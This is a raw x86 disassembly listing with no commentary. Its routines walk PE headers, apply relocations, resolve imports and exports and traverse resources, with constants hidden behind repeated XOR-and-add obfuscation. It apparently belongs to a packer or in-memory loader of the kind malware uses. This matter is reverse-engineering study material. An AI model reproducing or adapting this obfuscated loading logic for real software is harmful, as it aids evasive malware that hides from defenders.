  417da2:	add    edx,0xffcd8d1e
  417da8:	xor    edx,esi
  417daa:	cmp    edx,0xf89c85ba
  417db0:	jne    0x417dd1
  417db2:	mov    edx,DWORD PTR [ebp-0x28]
  417db5:	add    edx,DWORD PTR [ebp+0x1c]
  417db8:	mov    ebx,DWORD PTR [eax]
  417dba:	cmp    DWORD PTR [ebx+edx*1],0x0
  417dbe:	je     0x417dce
  417dc0:	mov    ecx,DWORD PTR [ebp+0xc]
  417dc3:	add    ecx,DWORD PTR [ebx+edx*1]
  417dc6:	mov    ebx,DWORD PTR [eax]
  417dc8:	mov    DWORD PTR [edx+ebx*1],ecx
  417dcb:	mov    ecx,DWORD PTR [ebp-0x2c]
  417dce:	mov    ebx,DWORD PTR [ebp-0x14]
  417dd1:	add    DWORD PTR [ebp-0x4],0x2
  417dd5:	dec    DWORD PTR [ebp-0x18]
  417dd8:	jne    0x417d8a
  417dda:	mov    edx,DWORD PTR [ebp-0xc]
  417ddd:	add    DWORD PTR [ebp-0x8],edx
  417de0:	mov    edx,DWORD PTR [ebp-0x8]
  417de3:	cmp    edx,DWORD PTR [ecx+0xa4]
  417de9:	jae    0x417dfc
  417deb:	add    eax,DWORD PTR [ebp-0xc]
  417dee:	mov    edx,DWORD PTR [eax+0x4]
  417df1:	mov    DWORD PTR [ebp-0xc],edx
  417df4:	test   edx,edx
  417df6:	jne    0x417d74
  417dfc:	mov    eax,DWORD PTR [ebp-0x10]
  417dff:	mov    DWORD PTR [ebp-0x6c],eax
  417e02:	mov    DWORD PTR [ebp-0x70],0x4
  417e09:	mov    eax,DWORD PTR [ecx+0x50]
  417e0c:	mov    DWORD PTR [ebp-0x68],eax
  417e0f:	mov    eax,DWORD PTR [ebp-0x1c]
  417e12:	xor    eax,esi
  417e14:	add    eax,edi
  417e16:	mov    DWORD PTR [ebp-0x64],eax
  417e19:	lea    eax,[ebp-0x20]
  417e1c:	mov    DWORD PTR [ebp-0x60],eax
  417e1f:	lea    eax,[ebp-0x70]
  417e22:	push   eax
  417e23:	mov    eax,DWORD PTR [ebp+0x8]
  417e26:	xor    eax,esi
  417e28:	add    eax,edi
  417e2a:	push   eax
  417e2b:	mov    eax,DWORD PTR [ebp+0x20]
  417e2e:	add    eax,0xee
  417e33:	push   eax
  417e34:	mov    eax,DWORD PTR [ebp+0x20]
  417e37:	mov    eax,DWORD PTR [eax+0x198]
  417e3d:	push   DWORD PTR [eax]
  417e3f:	mov    eax,DWORD PTR [ebp+0x10]
  417e42:	call   eax
  417e44:	mov    eax,DWORD PTR [ebp+0x20]
  417e47:	mov    eax,DWORD PTR [eax+0x180]
  417e4d:	add    eax,DWORD PTR [ebp+0xc]
  417e50:	mov    ecx,DWORD PTR [ebp+0xc]
  417e53:	push   DWORD PTR [ebp+0x18]
  417e56:	mov    DWORD PTR [eax],ecx
  417e58:	push   DWORD PTR [ebp+0x14]
  417e5b:	push   DWORD PTR [ebp+0x1c]
  417e5e:	call   ebx
  417e60:	mov    ecx,DWORD PTR [ebp+0xc]
  417e63:	add    ecx,DWORD PTR [ebp+0x20]
  417e66:	lea    eax,[ebp+0x4]
  417e69:	mov    DWORD PTR [ebp+0x20],ecx
  417e6c:	mov    ecx,DWORD PTR [ebp+0x20]
  417e6f:	mov    ecx,DWORD PTR [ebp+0x20]
  417e72:	mov    edx,DWORD PTR [ecx+0x190]
  417e78:	mov    ecx,DWORD PTR [ebp+0x20]
  417e7b:	mov    ecx,DWORD PTR [ecx+0x18c]
  417e81:	mov    esi,DWORD PTR [ecx]
  417e83:	cmp    DWORD PTR [eax],esi
  417e85:	jb     0x417ea6
  417e87:	mov    esi,DWORD PTR [edx]
  417e89:	mov    edi,DWORD PTR [edx]
  417e8b:	mov    esi,DWORD PTR [esi+0x3c]
  417e8e:	lea    esi,[edi+esi*1+0x50]
  417e92:	mov    edi,DWORD PTR [ecx]
  417e94:	add    edi,DWORD PTR [esi]
  417e96:	cmp    DWORD PTR [eax],edi
  417e98:	jae    0x417ea6
  417e9a:	mov    esi,DWORD PTR [ecx]
  417e9c:	mov    ecx,DWORD PTR [eax]
  417e9e:	mov    edx,DWORD PTR [edx]
  417ea0:	sub    ecx,esi
  417ea2:	add    edx,ecx
  417ea4:	mov    DWORD PTR [eax],edx
  417ea6:	mov    eax,DWORD PTR [ebp+0xc]
  417ea9:	jmp    0x417ead
  417eab:	xor    eax,eax
  417ead:	pop    edi
  417eae:	pop    esi
  417eaf:	pop    ebx
  417eb0:	leave  
  417eb1:	ret    0x1c
  417eb4:	push   ebp
  417eb5:	mov    ebp,esp
  417eb7:	sub    esp,0x1c
  417eba:	push   esi
  417ebb:	mov    esi,eax
  417ebd:	mov    eax,DWORD PTR [ecx+0x190]
  417ec3:	cmp    DWORD PTR [eax],0x0
  417ec6:	je     0x417fd6
  417ecc:	test   edx,edx
  417ece:	je     0x417fd6
  417ed4:	test   esi,esi
  417ed6:	je     0x417fd6
  417edc:	mov    eax,DWORD PTR [esi+0x88]
  417ee2:	test   eax,eax
  417ee4:	je     0x417fd1
  417eea:	cmp    DWORD PTR [esi+0x8c],0x10
  417ef1:	je     0x417fd1
  417ef7:	cmp    DWORD PTR [esi+0x34],edx
  417efa:	je     0x417fd1
  417f00:	mov    esi,DWORD PTR [ecx+0x18c]
  417f06:	and    DWORD PTR [ebp-0x10],0x0
  417f0a:	mov    ecx,edx
  417f0c:	sub    ecx,DWORD PTR [esi]
  417f0e:	add    eax,edx
  417f10:	movzx  edx,WORD PTR [eax+0xc]
  417f14:	mov    DWORD PTR [ebp-0x1c],ecx
  417f17:	movzx  ecx,WORD PTR [eax+0xe]
  417f1b:	add    ecx,edx
  417f1d:	je     0x417fd1
  417f23:	lea    ecx,[eax+0x14]
  417f26:	push   ebx
  417f27:	mov    DWORD PTR [ebp-0x18],ecx
  417f2a:	mov    esi,0x7fffffff
  417f2f:	push   edi
  417f30:	test   DWORD PTR [ecx],esi
  417f32:	je     0x417fb3
  417f34:	mov    edx,DWORD PTR [ecx]
  417f36:	and    DWORD PTR [ebp-0xc],0x0
  417f3a:	and    edx,esi
  417f3c:	add    edx,eax
  417f3e:	movzx  edi,WORD PTR [edx+0xe]
  417f42:	movzx  ebx,WORD PTR [edx+0xc]
  417f46:	add    edi,ebx
  417f48:	je     0x417fb3
  417f4a:	lea    ecx,[edx+0x14]
  417f4d:	mov    DWORD PTR [ebp-0x14],ecx
  417f50:	test   DWORD PTR [ecx],esi
  417f52:	je     0x417f95
  417f54:	mov    ecx,DWORD PTR [ecx]
  417f56:	and    DWORD PTR [ebp-0x8],0x0
  417f5a:	and    ecx,esi
  417f5c:	add    ecx,eax
  417f5e:	movzx  edi,WORD PTR [ecx+0xe]
  417f62:	movzx  ebx,WORD PTR [ecx+0xc]
  417f66:	add    edi,ebx
  417f68:	je     0x417f95
  417f6a:	lea    edi,[ecx+0x14]
  417f6d:	mov    DWORD PTR [ebp-0x4],edi
  417f70:	mov    edi,DWORD PTR [ebp-0x4]
  417f73:	mov    edi,DWORD PTR [edi]
  417f75:	test   edi,edi
  417f77:	je     0x417f7f
  417f79:	mov    ebx,DWORD PTR [ebp-0x1c]
  417f7c:	add    DWORD PTR [edi+eax*1],ebx
  417f7f:	movzx  edi,WORD PTR [ecx+0xe]
  417f83:	movzx  ebx,WORD PTR [ecx+0xc]
  417f87:	inc    DWORD PTR [ebp-0x8]
  417f8a:	add    DWORD PTR [ebp-0x4],0x8
  417f8e:	add    edi,ebx
  417f90:	cmp    DWORD PTR [ebp-0x8],edi
  417f93:	jb     0x417f70
  417f95:	movzx  edi,WORD PTR [edx+0xe]
  417f99:	movzx  ebx,WORD PTR [edx+0xc]
  417f9d:	mov    ecx,DWORD PTR [ebp-0x14]
  417fa0:	inc    DWORD PTR [ebp-0xc]
  417fa3:	add    ecx,0x8
  417fa6:	add    edi,ebx
  417fa8:	mov    DWORD PTR [ebp-0x14],ecx
  417fab:	cmp    DWORD PTR [ebp-0xc],edi
  417fae:	jb     0x417f50
  417fb0:	mov    ecx,DWORD PTR [ebp-0x18]
  417fb3:	movzx  edx,WORD PTR [eax+0xe]
  417fb7:	movzx  edi,WORD PTR [eax+0xc]
  417fbb:	inc    DWORD PTR [ebp-0x10]
  417fbe:	add    ecx,0x8
  417fc1:	add    edx,edi
  417fc3:	mov    DWORD PTR [ebp-0x18],ecx
  417fc6:	cmp    DWORD PTR [ebp-0x10],edx
  417fc9:	jb     0x417f30
  417fcf:	pop    edi
  417fd0:	pop    ebx
  417fd1:	xor    eax,eax
  417fd3:	inc    eax
  417fd4:	jmp    0x417fd8
  417fd6:	xor    eax,eax
  417fd8:	pop    esi
  417fd9:	leave  
  417fda:	ret    
  417fdb:	push   ebp
  417fdc:	mov    ebp,esp
  417fde:	mov    ecx,DWORD PTR [ecx+0x190]
  417fe4:	mov    eax,DWORD PTR [ebp+0xc]
  417fe7:	sub    esp,0x10
  417fea:	push   ebx
  417feb:	xor    ebx,ebx
  417fed:	push   esi
  417fee:	push   edi
  417fef:	cmp    DWORD PTR [ecx],ebx
  417ff1:	je     0x418079
  417ff7:	cmp    eax,ebx
  417ff9:	je     0x418079
  417ffb:	cmp    DWORD PTR [eax+0x78],ebx
  417ffe:	jne    0x418005
  418000:	xor    eax,eax
  418002:	inc    eax
  418003:	jmp    0x41807b
  418005:	mov    eax,DWORD PTR [eax+0x78]
  418008:	add    eax,DWORD PTR [ebp+0x8]
  41800b:	mov    ecx,DWORD PTR [eax+0x1c]
  41800e:	mov    edx,DWORD PTR [eax+0x24]
  418011:	mov    esi,DWORD PTR [eax+0x14]
  418014:	mov    edi,DWORD PTR [eax+0x18]
  418017:	add    ecx,DWORD PTR [ebp+0x8]
  41801a:	add    edx,DWORD PTR [ebp+0x8]
  41801d:	mov    DWORD PTR [ebp-0x4],esi
  418020:	cmp    esi,edi
  418022:	ja     0x418027
  418024:	mov    DWORD PTR [ebp-0x4],edi
  418027:	mov    DWORD PTR [ebp-0x8],ebx
  41802a:	cmp    DWORD PTR [ebp-0x4],ebx
  41802d:	jbe    0x418000
  41802f:	cmp    ebx,DWORD PTR [eax+0x14]
  418032:	jae    0x41803a
  418034:	movzx  esi,WORD PTR [edx+ebx*2]
  418038:	jmp    0x41803c
  41803a:	mov    esi,ebx
  41803c:	lea    esi,[ecx+esi*4]
  41803f:	mov    edi,DWORD PTR [esi]
  418041:	test   edi,edi
  418043:	je     0x41806e
  418045:	add    edi,DWORD PTR [ebp+0x8]
  418048:	mov    DWORD PTR [ebp-0x10],edi
  41804b:	cmp    edi,eax
  41804d:	jbe    0x41805f
  41804f:	mov    ebx,DWORD PTR [ebp+0xc]
  418052:	mov    ebx,DWORD PTR [ebx+0x7c]
  418055:	add    ebx,eax
  418057:	cmp    edi,ebx
  418059:	jae    0x41805f
  41805b:	mov    esi,DWORD PTR [esi]
  41805d:	jmp    0x418067
  41805f:	sub    edi,DWORD PTR [ebp+0x8]
  418062:	mov    DWORD PTR [esi],edi
  418064:	mov    esi,DWORD PTR [ebp-0x10]
  418067:	test   esi,esi
  418069:	je     0x418079
  41806b:	mov    ebx,DWORD PTR [ebp-0x8]
  41806e:	inc    ebx
  41806f:	mov    DWORD PTR [ebp-0x8],ebx
  418072:	cmp    ebx,DWORD PTR [ebp-0x4]
  418075:	jb     0x41802f
  418077:	jmp    0x418000
  418079:	xor    eax,eax
  41807b:	pop    edi
  41807c:	pop    esi
  41807d:	pop    ebx
  41807e:	leave  
  41807f:	ret    0x8
  418082:	push   ebp
  418083:	mov    ebp,esp
  418085:	sub    esp,0x2c
  418088:	mov    edx,0xf89c8585
  41808d:	mov    DWORD PTR [ebp-0x4],edx
  418090:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418097:	mov    eax,DWORD PTR [ebp-0x4]
  41809a:	mov    ecx,DWORD PTR [ebp-0x4]
  41809d:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a9:	push   ebx
  4180aa:	mov    ebx,DWORD PTR [ebp+0x10]
  4180ad:	push   esi
  4180ae:	mov    esi,0x751089b
  4180b3:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4180ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4180bd:	mov    ebx,DWORD PTR [ebx+0x190]
  4180c3:	push   edi
  4180c4:	mov    edi,0x3272e2
  4180c9:	xor    ecx,esi
  4180cb:	xor    eax,esi
  4180cd:	add    eax,edi
  4180cf:	add    ecx,edi
  4180d1:	mov    DWORD PTR [ebp-0x18],eax
  4180d4:	cmp    ecx,DWORD PTR [ebx]
  4180d6:	je     0x418357
  4180dc:	mov    ebx,DWORD PTR [ebp-0x4]
  4180df:	mov    ecx,DWORD PTR [ebp+0xc]
  4180e2:	xor    ebx,esi
  4180e4:	add    ebx,edi
  4180e6:	cmp    ebx,ecx
  4180e8:	je     0x418357
  4180ee:	mov    ebx,DWORD PTR [ebp-0x4]
  4180f1:	mov    ecx,DWORD PTR [ecx+0x80]
  4180f7:	xor    ebx,esi
  4180f9:	add    ebx,edi
  4180fb:	cmp    ecx,ebx
  4180fd:	je     0x418352
  418103:	add    ecx,DWORD PTR [ebp+0x8]
  418106:	mov    DWORD PTR [ebp-0x2c],ecx
  418109:	mov    ebx,edx
  41810b:	xor    ebx,esi
  41810d:	add    ebx,edi
  41810f:	mov    DWORD PTR [ebp-0x10],ebx
  418112:	mov    ebx,DWORD PTR [ebp-0x10]
  418115:	cmp    ebx,edx
  418117:	je     0x41812b
  418119:	mov    edx,DWORD PTR [ebp-0x10]
  41811c:	mov    ebx,DWORD PTR [ebp-0x4]
  41811f:	imul   edx,edx,0x14
  418122:	xor    ebx,esi
  418124:	add    ebx,edi
  418126:	cmp    DWORD PTR [edx+ecx*1],ebx
  418129:	jne    0x418142
  41812b:	mov    edx,DWORD PTR [ebp-0x10]
  41812e:	mov    ebx,DWORD PTR [ebp-0x4]
  418131:	imul   edx,edx,0x14
  418134:	xor    ebx,esi
  418136:	add    ebx,edi
  418138:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41813c:	je     0x418344
  418142:	mov    eax,DWORD PTR [ebp-0x4]
  418145:	mov    ebx,DWORD PTR [ebp-0x4]
  418148:	mov    eax,DWORD PTR [ebp-0x10]
  41814b:	imul   eax,eax,0x14
  41814e:	add    eax,ecx
  418150:	mov    ecx,DWORD PTR [eax+0x10]
  418153:	add    ecx,DWORD PTR [ebp+0x8]
  418156:	xor    ebx,esi
  418158:	mov    DWORD PTR [ebp-0x1c],ecx
  41815b:	mov    ecx,DWORD PTR [ebp-0x4]
  41815e:	mov    edx,DWORD PTR [ebp-0x4]
  418161:	xor    ecx,esi
  418163:	add    ecx,edi
  418165:	xor    edx,esi
  418167:	mov    DWORD PTR [ebp-0x24],ecx
  41816a:	mov    ecx,DWORD PTR [eax]
  41816c:	add    edx,edi
  41816e:	add    ebx,edi
  418170:	cmp    ecx,edx
  418172:	je     0x41817a
  418174:	add    ecx,DWORD PTR [ebp+0x8]
  418177:	mov    DWORD PTR [ebp-0x24],ecx
  41817a:	mov    ecx,DWORD PTR [ebp-0x4]
  41817d:	xor    ecx,esi
  41817f:	add    ecx,DWORD PTR [eax+0xc]
  418182:	mov    eax,DWORD PTR [ebp+0x8]
  418185:	lea    eax,[ecx+eax*1+0x3272e2]
  41818c:	mov    DWORD PTR [ebp+0xc],eax
  41818f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  418196:	mov    eax,DWORD PTR [ebp+0x10]
  418199:	push   DWORD PTR [ebp+0xc]
  41819c:	mov    eax,DWORD PTR [eax+0x1d8]
  4181a2:	call   DWORD PTR [eax]
  4181a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4181a7:	xor    ecx,esi
  4181a9:	add    ecx,edi
  4181ab:	mov    DWORD PTR [ebp-0xc],eax
  4181ae:	cmp    ecx,eax
  4181b0:	jne    0x4181c4
  4181b2:	mov    eax,DWORD PTR [ebp+0x10]
  4181b5:	push   DWORD PTR [ebp+0xc]
  4181b8:	mov    eax,DWORD PTR [eax+0x1d8]
  4181be:	call   DWORD PTR [eax+0xc]
  4181c1:	mov    DWORD PTR [ebp-0xc],eax
  4181c4:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  4181cb:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  4181d2:	mov    eax,DWORD PTR [ebp-0x4]
  4181d5:	xor    eax,esi
  4181d7:	add    eax,edi
  4181d9:	cmp    eax,DWORD PTR [ebp-0xc]
  4181dc:	jne    0x418201
  4181de:	mov    eax,DWORD PTR [ebp-0x8]
  4181e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4181e4:	xor    eax,esi
  4181e6:	xor    ecx,esi
  4181e8:	lea    ebx,[ebx+eax*1+0x3272e2]
  4181ef:	mov    eax,DWORD PTR [ebp+0x10]
  4181f2:	mov    eax,DWORD PTR [eax+0x1d8]
  4181f8:	add    ecx,edi
  4181fa:	imul   ecx,ebx
  4181fd:	push   ecx
  4181fe:	call   DWORD PTR [eax+0x24]
  418201:	mov    eax,DWORD PTR [ebp-0x4]
  418204:	xor    eax,esi
  418206:	add    eax,edi
  418208:	cmp    eax,DWORD PTR [ebp-0xc]
  41820b:	jne    0x41821c
  41820d:	mov    eax,DWORD PTR [ebp-0x28]
  418210:	xor    eax,esi
  418212:	add    eax,edi
  418214:	cmp    ebx,eax
  418216:	jbe    0x418196
  41821c:	mov    eax,DWORD PTR [ebp-0x4]
  41821f:	xor    eax,esi
  418221:	add    eax,edi
  418223:	cmp    eax,DWORD PTR [ebp-0xc]
  418226:	jne    0x41823f
  418228:	mov    eax,DWORD PTR [ebp-0x8]
  41822b:	mov    ecx,DWORD PTR [ebp-0x18]
  41822e:	xor    eax,esi
  418230:	lea    eax,[ecx+eax*1+0x3272e2]
  418237:	mov    DWORD PTR [ebp-0x18],eax
  41823a:	jmp    0x41832e
  41823f:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  418246:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41824d:	mov    ebx,DWORD PTR [ebp-0x4]
  418250:	xor    ebx,esi
  418252:	add    ebx,edi
  418254:	jmp    0x41831b
  418259:	mov    eax,DWORD PTR [ebp-0x4]
  41825c:	xor    eax,esi
  41825e:	add    eax,edi
  418260:	mov    DWORD PTR [ebp-0x14],eax
  418263:	mov    eax,DWORD PTR [ebp-0x4]
  418266:	xor    eax,esi
  418268:	add    eax,edi
  41826a:	mov    DWORD PTR [ebp+0xc],eax
  41826d:	mov    ecx,DWORD PTR [ebp-0x4]
  418270:	mov    eax,DWORD PTR [ebp-0x24]
  418273:	xor    ecx,esi
  418275:	add    ecx,edi
  418277:	cmp    ecx,eax
  418279:	je     0x418281
  41827b:	mov    eax,DWORD PTR [eax+ebx*4]
  41827e:	mov    DWORD PTR [ebp-0x14],eax
  418281:	mov    eax,DWORD PTR [ebp-0x1c]
  418284:	mov    eax,DWORD PTR [eax+ebx*4]
  418287:	mov    DWORD PTR [ebp+0xc],eax
  41828a:	mov    eax,DWORD PTR [ebp-0x4]
  41828d:	mov    ecx,DWORD PTR [ebp-0x14]
  418290:	xor    eax,esi
  418292:	add    eax,edi
  418294:	cmp    eax,ecx
  418296:	je     0x4182c1
  418298:	mov    eax,DWORD PTR [ebp-0x4]
  41829b:	mov    ecx,DWORD PTR [ebp-0x14]
  41829e:	xor    eax,esi
  4182a0:	add    eax,edi
  4182a2:	shr    ecx,0x1f
  4182a5:	cmp    eax,ecx
  4182a7:	je     0x4182c1
  4182a9:	mov    ecx,DWORD PTR [ebp-0x14]
  4182ac:	mov    eax,DWORD PTR [ebp+0x10]
  4182af:	mov    eax,DWORD PTR [eax+0x1d8]
  4182b5:	movzx  ecx,cx
  4182b8:	push   ecx
  4182b9:	push   DWORD PTR [ebp-0xc]
  4182bc:	call   DWORD PTR [eax+0x8]
  4182bf:	jmp    0x4182da
  4182c1:	mov    eax,DWORD PTR [ebp+0xc]
  4182c4:	add    eax,DWORD PTR [ebp+0x8]
  4182c7:	mov    ecx,DWORD PTR [ebp+0x10]
  4182ca:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4182d0:	add    eax,0x2
  4182d3:	push   eax
  4182d4:	push   DWORD PTR [ebp-0xc]
  4182d7:	call   DWORD PTR [ecx+0x8]
  4182da:	mov    DWORD PTR [ebp+0xc],eax
  4182dd:	mov    eax,DWORD PTR [ebp-0x4]
  4182e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4182e3:	xor    eax,esi
  4182e5:	add    eax,edi
  4182e7:	cmp    eax,ecx
  4182e9:	mov    eax,DWORD PTR [ebp-0x8]
  4182ec:	jne    0x4182ff
  4182ee:	mov    ecx,DWORD PTR [ebp-0x18]
  4182f1:	xor    eax,esi
  4182f3:	lea    eax,[ecx+eax*1+0x3272e2]
  4182fa:	mov    DWORD PTR [ebp-0x18],eax
  4182fd:	jmp    0x41830f
  4182ff:	mov    ecx,DWORD PTR [ebp+0xc]
  418302:	xor    eax,esi
  418304:	add    eax,edi
  418306:	imul   eax,ecx
  418309:	mov    ecx,DWORD PTR [ebp-0x1c]
  41830c:	mov    DWORD PTR [ecx+ebx*4],eax
  41830f:	mov    eax,DWORD PTR [ebp-0x8]
  418312:	xor    eax,esi
  418314:	lea    ebx,[ebx+eax*1+0x3272e2]
  41831b:	mov    eax,DWORD PTR [ebp-0x4]
  41831e:	mov    ecx,DWORD PTR [ebp-0x1c]
  418321:	xor    eax,esi
  418323:	add    eax,edi
  418325:	cmp    DWORD PTR [ecx+ebx*4],eax
  418328:	jne    0x418259
  41832e:	mov    edx,DWORD PTR [ebp-0x10]
  418331:	mov    eax,DWORD PTR [ebp-0x18]
  418334:	mov    ecx,DWORD PTR [ebp-0x2c]
  418337:	sub    edx,0x3272e1
  41833d:	xor    edx,esi
  41833f:	jmp    0x418109
  418344:	mov    ecx,DWORD PTR [ebp-0x4]
  418347:	xor    ecx,esi
  418349:	add    ecx,edi
  41834b:	cmp    eax,ecx
  41834d:	mov    eax,DWORD PTR [ebp-0x4]
  418350:	jne    0x41835a
  418352:	mov    eax,DWORD PTR [ebp-0x8]
  418355:	jmp    0x41835a
  418357:	mov    eax,DWORD PTR [ebp-0x4]
  41835a:	xor    eax,esi
  41835c:	add    eax,edi
  41835e:	pop    edi
  41835f:	pop    esi
  418360:	pop    ebx
  418361:	leave  
  418362:	ret    0xc
  418365:	push   ebp
  418366:	mov    ebp,esp
  418368:	sub    esp,0x28
  41836b:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418372:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  418379:	mov    eax,DWORD PTR [ebp+0xc]
  41837c:	mov    DWORD PTR [ebp+0xc],eax
  41837f:	push   esi
  418380:	mov    eax,eax
  418382:	mov    eax,DWORD PTR [ebp-0x4]
  418385:	mov    esi,DWORD PTR [ebp+0x8]
  418388:	mov    ecx,0x751089b
  41838d:	xor    eax,ecx
  41838f:	mov    edx,0x3272e2
  418394:	add    eax,edx
  418396:	cmp    esi,eax
  418398:	je     0x4184bf
  41839e:	mov    eax,DWORD PTR [ebp+0x8]
  4183a1:	mov    esi,DWORD PTR [ebp+0x8]
  4183a4:	add    esi,DWORD PTR [eax+0x3c]
  4183a7:	push   edi
  4183a8:	mov    DWORD PTR [ebp+0xc],esi
  4183ab:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  4183b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4183b5:	mov    esi,DWORD PTR [ebp-0x4]
  4183b8:	mov    edi,DWORD PTR [ebp+0xc]
  4183bb:	xor    esi,ecx
  4183bd:	xor    eax,ecx
  4183bf:	add    esi,edx
  4183c1:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  4183c8:	je     0x4184b9
  4183ce:	mov    esi,DWORD PTR [ebp+0xc]
  4183d1:	mov    eax,DWORD PTR [ebp+0x8]
  4183d4:	add    eax,DWORD PTR [esi+0xa0]
  4183da:	mov    esi,DWORD PTR [ebp+0x8]
  4183dd:	mov    edi,DWORD PTR [ebp+0xc]
  4183e0:	sub    esi,DWORD PTR [edi+0x34]
  4183e3:	mov    edi,DWORD PTR [ebp-0x4]
  4183e6:	xor    edi,ecx
  4183e8:	add    edi,edx
  4183ea:	mov    DWORD PTR [ebp-0x24],esi
  4183ed:	cmp    esi,edi
  4183ef:	je     0x4184b9
  4183f5:	mov    esi,DWORD PTR [ebp-0x4]
  4183f8:	xor    esi,ecx
  4183fa:	add    esi,edx
  4183fc:	mov    DWORD PTR [ebp-0x8],esi
  4183ff:	push   ebx
  418400:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  418407:	jmp    0x4184a3
  41840c:	mov    esi,DWORD PTR [ebp-0x4]
  41840f:	xor    esi,ecx
  418411:	lea    edi,[ebx-0x8]
  418414:	add    esi,edx
  418416:	shr    edi,1
  418418:	cmp    esi,edi
  41841a:	jae    0x418489
  41841c:	sub    edi,esi
  41841e:	lea    ebx,[eax+esi*2+0x8]
  418422:	mov    DWORD PTR [ebp-0x18],edi
  418425:	movzx  esi,WORD PTR [ebx]
  418428:	and    esi,0xfff
  41842e:	mov    DWORD PTR [ebp-0x14],esi
  418431:	mov    edi,DWORD PTR [ebp-0x14]
  418434:	mov    esi,DWORD PTR [eax]
  418436:	sub    esi,edx
  418438:	add    edi,esi
  41843a:	movzx  esi,WORD PTR [ebx]
  41843d:	shr    esi,0xc
  418440:	xor    edi,ecx
  418442:	mov    DWORD PTR [ebp-0x20],edi
  418445:	mov    DWORD PTR [ebp-0x14],esi
  418448:	mov    esi,DWORD PTR [ebp-0x20]
  41844b:	mov    edi,DWORD PTR [ebp+0x8]
  41844e:	xor    esi,ecx
  418450:	lea    esi,[esi+edi*1+0x3272e2]
  418457:	mov    DWORD PTR [ebp-0x20],esi
  41845a:	mov    esi,DWORD PTR [ebp-0x10]
  41845d:	mov    edi,DWORD PTR [ebp-0x14]
  418460:	xor    esi,ecx
  418462:	add    esi,edx
  418464:	cmp    edi,esi
  418466:	jne    0x41847e
  418468:	mov    esi,DWORD PTR [ebp-0x10]
  41846b:	mov    edi,DWORD PTR [ebp-0x14]
  41846e:	xor    esi,ecx
  418470:	add    esi,edx
  418472:	cmp    edi,esi
  418474:	jne    0x41847e
  418476:	mov    esi,DWORD PTR [ebp-0x20]
  418479:	mov    edi,DWORD PTR [ebp-0x24]
  41847c:	add    DWORD PTR [esi],edi
  41847e:	add    ebx,0x2
  418481:	dec    DWORD PTR [ebp-0x18]
  418484:	jne    0x418425
  418486:	mov    ebx,DWORD PTR [ebp-0xc]
  418489:	add    DWORD PTR [ebp-0x8],ebx
  41848c:	mov    esi,DWORD PTR [ebp-0x1c]
  41848f:	mov    edi,DWORD PTR [ebp-0x8]
  418492:	mov    ebx,DWORD PTR [ebp+0xc]
  418495:	xor    esi,ecx
  418497:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41849e:	jae    0x4184b8
  4184a0:	add    eax,DWORD PTR [ebp-0xc]
  4184a3:	mov    esi,DWORD PTR [ebp-0x4]
  4184a6:	mov    ebx,DWORD PTR [eax+0x4]
  4184a9:	xor    esi,ecx
  4184ab:	add    esi,edx
  4184ad:	mov    DWORD PTR [ebp-0xc],ebx
  4184b0:	cmp    ebx,esi
  4184b2:	jne    0x41840c
  4184b8:	pop    ebx
  4184b9:	mov    eax,DWORD PTR [ebp-0x28]
  4184bc:	pop    edi
  4184bd:	jmp    0x4184c2
  4184bf:	mov    eax,DWORD PTR [ebp-0x4]
  4184c2:	xor    eax,ecx
  4184c4:	add    eax,edx
  4184c6:	pop    esi
  4184c7:	leave  
  4184c8:	ret    0x8
  4184cb:	push   ebp
  4184cc:	mov    ebp,esp
  4184ce:	sub    esp,0xcc
  4184d4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  4184db:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  4184e2:	mov    eax,DWORD PTR [ebp-0x4]
  4184e5:	push   ebx
  4184e6:	push   esi
  4184e7:	mov    esi,0x751089b
  4184ec:	xor    eax,esi
  4184ee:	push   edi
  4184ef:	mov    edi,0x3272e2
  4184f4:	add    eax,edi
  4184f6:	mov    DWORD PTR [ebp-0x1c],eax
  4184f9:	mov    eax,DWORD PTR [ebp-0x4]
  4184fc:	xor    eax,esi
  4184fe:	add    eax,edi
  418500:	mov    DWORD PTR [ebp-0x8],eax
  418503:	mov    ebx,DWORD PTR [ebp+0x20]
  418506:	mov    eax,DWORD PTR [ebp-0x14]
  418509:	mov    ecx,DWORD PTR [ebp-0x14]
  41850c:	xor    eax,ecx
  41850e:	mov    DWORD PTR [ebp-0x14],eax
  418511:	add    DWORD PTR [ebp-0x14],0xf89cb585
  418518:	mov    eax,DWORD PTR [ebp-0xc]
  41851b:	mov    ecx,DWORD PTR [ebp-0xc]
  41851e:	xor    eax,ecx
  418520:	mov    DWORD PTR [ebp-0xc],eax
  418523:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41852a:	mov    eax,DWORD PTR [ebp-0x10]
  41852d:	mov    ecx,DWORD PTR [ebp-0x10]
  418530:	xor    eax,ecx
  418532:	mov    DWORD PTR [ebp-0x10],eax
  418535:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41853c:	mov    eax,DWORD PTR [ebp-0x20]
  41853f:	mov    ecx,DWORD PTR [ebp-0x20]
  418542:	xor    eax,ecx
  418544:	mov    DWORD PTR [ebp-0x20],eax
  418547:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41854e:	mov    eax,0x9471
  418553:	mov    WORD PTR [ebp+0x20],ax
